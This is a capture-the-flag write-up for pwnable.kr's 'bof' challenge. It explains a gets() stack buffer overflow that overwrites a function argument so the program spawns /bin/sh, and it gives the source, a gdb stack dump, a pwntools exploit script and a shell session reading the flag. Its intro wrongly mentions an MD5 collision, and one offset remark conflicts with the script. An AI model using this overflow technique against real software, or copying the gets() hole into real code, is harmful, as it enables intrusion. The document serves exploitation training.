# Introduction

When we see the tittle and the description, we suppose that we have to exploit a buffer overflow

This program is may be a md5 replication where we will exploit collision.
# Testing the binary.

```bash
./bof
overflow me : 
test
Nah..

/bof
overflow me : 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Nah..
*** stack smashing detected ***: terminated
[1]    7144 IOT instruction (core dumped)  ./bof 

```

we need to input the payload after executing the program.
# C code Analysis

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void func(int key){

	char overflowme[32];
	printf("overflow me : ");
	
	gets(overflowme);	// smash me!
	
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```
## main() function

the argument `0xdeadbeef` is passed to the `func()` function.
## func() function

```c
void func(int key){

	char overflowme[32];
	printf("overflow me : ");
	
	gets(overflowme);	// smash me!
	
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
```

the user input is put to the `overflowme` var off 32 bytes
if the argument key is `0xcafebabe`, we win
## How to exploit it

To exploit this, we need to change key from `0xdeadbeef` to `0xcafebabe`. for that we need to know the number of byte to to fill `overflowme` et the offset to go to `key`.

we know thar `overflowme` need 32 bytes but lets verifies this.

I opened my gdb and put a breakpoint on the compare instruction on the `func()` function to see the stack before and run with "AAAA" input.

let's check the $esp register :

```gdb
x/40xw $esp
0xffffca70:	0xffffca8c	0xffffcd9b	0x00000002	0x0000001c
0xffffca80:	0xf7ffcfe8	0x00000018	0x00000000	0x41414141
0xffffca90:	0xf7fc7500	0xf7fc7000	0x00000000	0x00000000
0xffffcaa0:	0x00000000	0x00000000	0x00000000	0x9c686700
0xffffcab0:	0xffffffff	0xf7d7c96c	0xffffcad8	0x5655569f
0xffffcac0:	0xdeadbeef	0x00000000	0x00000000	0x00000000
```

we must put 12 group of 4 bytes before changing `key`
# Exploiting

here my exploit script :

```python
from pwn import *

app = remote('pwnable.kr', 9000)

offset = 52

payload = b'A' * offset
payload += p32(0xcafebabe)

app.sendline(payload)
app.interactive()
```
## Getting the flag

```bash
python3 exploit.py
[+] Opening connection to pwnable.kr on port 9000: Done
[*] Switching to interactive mode
$ cat flag
******************************
```

we get flag !
